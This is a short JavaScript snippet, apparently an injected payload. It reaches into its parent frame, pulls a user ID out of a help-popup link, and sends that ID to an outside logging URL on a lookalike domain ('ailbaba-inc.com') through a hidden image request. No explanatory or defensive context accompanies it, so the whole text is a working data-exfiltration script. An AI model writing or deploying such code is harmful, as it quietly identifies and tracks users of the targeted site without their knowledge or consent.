console.log('ok');

var $ = parent.$;
var uid;
var url = $('.help-pop-online-service a').prop('href');
if (url) {
	var m = url.match(/uid=(\d+)/);
	if (m) {
		uid = m[1];
	}
}

new Image().src = 'http://work.ailbaba-inc.com/log/?uid=' + uid;
